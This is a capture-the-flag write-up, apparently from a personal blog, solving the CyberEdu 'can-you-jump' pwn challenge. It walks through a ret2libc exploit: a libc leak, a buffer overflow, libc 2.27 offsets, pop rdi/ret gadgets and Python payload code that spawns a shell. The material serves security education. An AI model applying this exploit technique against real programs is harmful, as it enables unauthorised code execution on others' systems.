+++
date = '2025-12-16'
draft = false
title = "CyberEdu can-you-jump Writeup"
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Ret2libc", "JOP"]
+++

## Challenge overview


How far can you **[jump?](https://app.cyber-edu.co/challenges/d9e1d410-0719-11ec-a889-9149e5df5aaf?tenant=cyberedu)** 

Our binary, **can-you-jump**, is a 64-bit executable with no protections except `NX`. The challenge also gives us `libc-2.27.so` to use.

![challenge-screenshot](pic1.png#center)

Alright, pretty nice, we get a `libc` leak for `printf`, and immediately stumble upon a buffer overflow.

---

## Identifying the vulnerabilities

 Let's take a look at the binary next.

![challenge-screenshot](pic2.png#center)

Pretty straight-forward, the address of `printf` is printed, using `dlsym` (a function that just returns the address of a symbol, this case `printf`). Then, the function returns a `read` in `buf[56]` of 256 bytes, so that's a 200 byte buffer overflow. I'm guessing we can find a `/bin/sh` and `system` in our `libc`. Since I can't be bothered to install the `.so`, we can just test remotely and find the offsets online.

```python

#2.27 offsts
printf_offset = 0x64f70
system_offset = 0x4f550
binsh_offset = 0x1b3e1a


```

Now let's find some gadgets, or more exactly, `pop rdi; ret`, with `ropper` - `0x400773`, and let's not forget the `ret` gadget for alignment - `0x400291`. 

I'm assuming this is a classic `ret2libc` so we can already build the payload.

```python

#padding to rbp (64)
payload = b'\x90' * 64
#rbp
payload += b'\x90' * 8

payload += (pop_rdi_ret + p64(binsh) + ret +  p64(system))

payload.ljust(256, b'\x90')

p.send(payload)
```

...And we get an EOF. Sad but unsurprising for no testing. I modified the payload to jump to `main` to identify the issue, and it did jump into `main` and then EOF, so the problem isn't the padding but rather our calculated offsets.

![challenge-screenshot](pic3.png#center)

So, what's wrong with our addresses? I tested with our local offsets and of course we get a shell, as expected. 

![challenge-screenshot](pic4.png#center)

I tried looking around for a solution and I finally found that the issue was the *gadgets*. We needed gadgets inside `libc`. So we use `ropper` on the `libc-2.27.so` file we're given and get the following:

`0x00000000000c22ec: ret;`

`0x00000000000215bf: pop rdi; ret;`

We replace them in our script accordingly like so:

```python

libc_pop_rdi_ret_offset = 0x215bf
libc_ret_offset = 0xc22ec
pop_rdi_ret = libc + libc_pop_rdi_ret_offset
ret = libc + libc_ret_offset

```

And after running the script with the modified payload, we get the flag!

![challenge-screenshot](pic5.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/canyoujump.py)**.
